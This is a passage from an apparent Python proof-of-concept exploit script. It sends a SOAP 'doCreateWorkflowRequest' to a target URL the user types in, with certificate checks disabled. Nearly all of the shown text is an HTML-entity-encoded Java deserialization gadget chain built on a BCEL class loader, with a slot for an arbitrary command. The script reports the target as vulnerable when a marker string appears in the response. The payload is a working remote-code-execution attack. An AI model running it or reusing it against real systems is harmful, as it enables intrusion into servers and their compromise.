7;&#50;&#36;&#100;&#102;&#36;&#120;&#50;&#36;&#101;&#55;&#36;&#105;&#54;&#36;&#102;&#100;&#36;&#99;&#48;&#36;&#84;&#70;&#112;&#36;&#106;&#36;&#55;&#102;&#36;&#102;&#50;&#36;&#68;&#36;&#97;&#48;&#36;&#83;&#36;&#101;&#100;&#36;&#51;&#99;&#36;&#101;&#51;&#36;&#109;&#36;&#57;&#97;&#56;&#36;&#103;&#36;&#57;&#52;&#36;&#100;&#54;&#36;&#97;&#51;&#36;&#79;&#36;&#78;&#48;&#36;&#100;&#49;&#36;&#56;&#56;&#77;&#88;&#36;&#56;&#49;&#56;&#36;&#97;&#50;&#36;&#101;&#56;&#36;&#101;&#54;&#36;&#100;&#101;&#36;&#51;&#101;&#36;&#97;&#99;&#36;&#99;&#52;&#97;&#36;&#55;&#101;&#97;&#36;&#56;&#99;&#36;&#54;&#48;&#36;&#86;&#36;&#97;&#54;&#36;&#100;&#48;&#36;&#56;&#50;&#51;&#104;&#36;&#99;&#53;&#36;&#70;&#106;&#36;&#53;&#100;&#36;&#99;&#50;&#106;&#36;&#102;&#99;&#36;&#99;&#56;&#36;&#95;&#36;&#56;&#97;&#36;&#101;&#98;&#88;&#79;&#111;&#107;&#113;&#36;&#68;&#36;&#101;&#98;&#36;&#102;&#48;&#36;&#88;&#54;&#36;&#54;&#48;&#36;&#104;&#36;&#98;&#100;&#36;&#99;&#100;&#36;&#100;&#51;&#36;&#57;&#102;&#36;&#56;&#57;&#36;&#101;&#102;&#36;&#98;&#49;&#36;&#106;&#36;&#51;&#98;&#36;&#89;&#111;&#36;&#84;&#36;&#98;&#101;&#67;&#36;&#72;&#36;&#102;&#100;&#85;&#36;&#102;&#48;&#36;&#55;&#102;&#36;&#90;&#36;&#57;&#100;&#36;&#100;&#56;&#36;&#99;&#57;&#36;&#99;&#56;&#36;&#100;&#100;&#36;&#101;&#99;&#36;&#102;&#99;&#36;&#102;&#55;&#36;&#101;&#48;&#36;&#53;&#101;&#70;&#36;&#51;&#100;&#36;&#99;&#99;&#55;&#36;&#100;&#52;&#36;&#55;&#100;&#36;&#57;&#52;&#85;&#49;&#36;&#56;&#50;&#36;&#99;&#55;&#79;&#36;&#97;&#53;&#56;&#107;&#36;&#51;&#102;&#36;&#56;&#53;&#36;&#100;&#51;&#120;&#36;&#65;&#36;&#80;&#66;&#101;&#36;&#97;&#52;&#36;&#51;&#101;&#36;&#51;&#99;&#68;&#36;&#57;&#57;&#36;&#99;&#54;&#120;&#36;&#51;&#98;&#36;&#102;&#49;&#48;&#118;&#36;&#97;&#49;&#36;&#56;&#54;&#81;&#36;&#53;&#98;&#36;&#100;&#48;&#36;&#56;&#53;&#36;&#100;&#100;&#36;&#102;&#99;&#36;&#103;&#36;&#98;&#97;&#65;&#36;&#102;&#98;&#110;&#36;&#51;&#99;&#36;&#99;&#50;&#36;&#89;&#36;&#99;&#52;&#36;&#75;&#36;&#55;&#98;&#36;&#102;&#48;&#36;&#117;&#36;&#101;&#55;&#36;&#98;&#100;&#36;&#102;&#99;&#36;&#51;&#98;&#36;&#56;&#56;&#36;&#100;&#99;&#36;&#99;&#52;&#36;&#101;&#102;&#36;&#97;&#56;&#85;&#36;&#100;&#49;&#36;&#97;&#51;&#98;&#36;&#57;&#102;&#36;&#56;&#97;&#36;&#53;&#101;&#36;&#86;&#36;&#55;&#100;&#36;&#119;&#36;&#102;&#54;&#36;&#56;&#55;&#36;&#112;&#36;&#57;&#102;&#36;&#102;&#98;&#36;&#99;&#51;&#36;&#102;&#49;&#36;&#56;&#48;&#36;&#56;&#97;&#36;&#56;&#51;&#80;&#36;&#98;&#56;&#36;&#98;&#97;&#73;&#36;&#102;&#98;&#36;&#102;&#102;&#36;&#97;&#49;&#90;&#36;&#82;&#36;&#97;&#101;&#36;&#79;&#36;&#100;&#99;&#100;&#36;&#97;&#54;&#36;&#98;&#52;&#36;&#101;&#97;&#36;&#57;&#49;&#36;&#99;&#51;&#36;&#97;&#49;&#36;&#73;&#77;&#36;&#80;&#51;&#36;&#54;&#48;&#36;&#70;&#36;&#107;&#36;&#102;&#98;&#36;&#88;&#36;&#57;&#102;&#36;&#115;&#36;&#56;&#51;&#36;&#97;&#97;&#36;&#101;&#99;&#36;&#74;&#36;&#65;&#36;&#65;&#10;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#97;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#111;&#117;&#116;&#101;&#114;&#45;&#99;&#108;&#97;&#115;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#110;&#97;&#109;&#101;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#111;&#114;&#67;&#76;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#114;&#101;&#110;&#116;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#117;&#110;&#46;&#109;&#105;&#115;&#99;&#46;&#76;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#36;&#69;&#120;&#116;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#112;&#97;&#114;&#101;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#50;&#99;&#101;&#114;&#116;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#104;&#97;&#115;&#104;&#116;&#97;&#98;&#108;&#101;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#101;&#115;&#32;&#100;&#101;&#102;&#105;&#110;&#101;&#100;&#45;&#105;&#110;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#108;&#97;&#110;&#103;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#68;&#111;&#109;&#97;&#105;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#108;&#111;&#97;&#100;&#101;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#46;&#46;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#114;&#105;&#110;&#99;&#105;&#112;&#97;&#108;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#104;&#97;&#115;&#65;&#108;&#108;&#80;&#101;&#114;&#109;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#104;&#97;&#115;&#65;&#108;&#108;&#80;&#101;&#114;&#109;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#97;&#116;&#105;&#99;&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;&#115;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#115;&#116;&#97;&#116;&#105;&#99;&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#107;&#101;&#121;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#107;&#101;&#121;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#68;&#111;&#109;&#97;&#105;&#110;&#62;&#10;&#60;&#100;&#111;&#109;&#97;&#105;&#110;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#36;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#83;&#101;&#116;&#34;&#32;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#61;&#34;&#99;&#117;&#115;&#116;&#111;&#109;&#34;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#95;&#45;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#115;&#101;&#116;&#34;&#62;&#60;&#47;&#99;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#117;&#116;&#101;&#120;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#36;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#83;&#101;&#116;&#34;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#34;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#34;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#95;&#45;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#111;&#109;&#97;&#105;&#110;&#115;&#62;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#110;&#97;&#116;&#105;&#118;&#101;&#76;&#105;&#98;&#114;&#97;&#114;&#105;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#97;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#76;&#111;&#99;&#107;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#65;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#83;&#116;&#97;&#116;&#117;&#115;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#65;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#83;&#116;&#97;&#116;&#117;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#103;&#110;&#111;&#114;&#101;&#100;&#95;&#95;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#106;&#97;&#118;&#97;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#106;&#97;&#118;&#97;&#120;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#115;&#117;&#110;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#103;&#110;&#111;&#114;&#101;&#100;&#95;&#95;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#114;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#83;&#121;&#110;&#116;&#104;&#101;&#116;&#105;&#99;&#82;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#97;&#116;&#104;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#46;&#60;&#47;&#99;&#108;&#97;&#115;&#115;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#95;&#95;&#108;&#111;&#97;&#100;&#101;&#100;&#67;&#108;&#97;&#115;&#115;&#101;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#114;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#101;&#114;&#84;&#111;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#117;&#110;&#46;&#109;&#105;&#115;&#99;&#46;&#76;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#36;&#69;&#120;&#116;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#112;&#97;&#114;&#101;&#110;&#116;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#111;&#114;&#67;&#76;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#116;&#121;&#112;&#101;&#62;&#75;&#69;&#89;&#83;&#60;&#47;&#116;&#121;&#112;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#110;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#66;&#121;&#116;&#101;&#65;&#114;&#114;&#97;&#121;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#98;&#117;&#102;&#62;&#60;&#47;&#98;&#117;&#102;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#112;&#111;&#115;&#62;&#48;&#60;&#47;&#112;&#111;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#97;&#114;&#107;&#62;&#48;&#60;&#47;&#109;&#97;&#114;&#107;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#117;&#110;&#116;&#62;&#48;&#60;&#47;&#99;&#111;&#117;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#105;&#115;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#110;&#115;&#117;&#109;&#101;&#100;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#99;&#111;&#110;&#115;&#117;&#109;&#101;&#100;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#116;&#114;&#97;&#110;&#115;&#102;&#101;&#114;&#70;&#108;&#97;&#118;&#111;&#114;&#115;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#97;&#116;&#97;&#72;&#97;&#110;&#100;&#108;&#101;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#97;&#116;&#97;&#76;&#101;&#110;&#62;&#48;&#60;&#47;&#100;&#97;&#116;&#97;&#76;&#101;&#110;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#47;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#39;&#47;&#62;&#10;&#32;&#32;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;&#10;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;</web:string>
            <web:string>2</web:string>
          </web:doCreateWorkflowRequest>
       </soapenv:Body>
    </soapenv:Envelope>'''.format(cmd=cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        if "powered by potatso" in response.text and response.status_code == 500:
            print("\033[36m[o] 存在漏洞 \n[o] 响应为:\n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
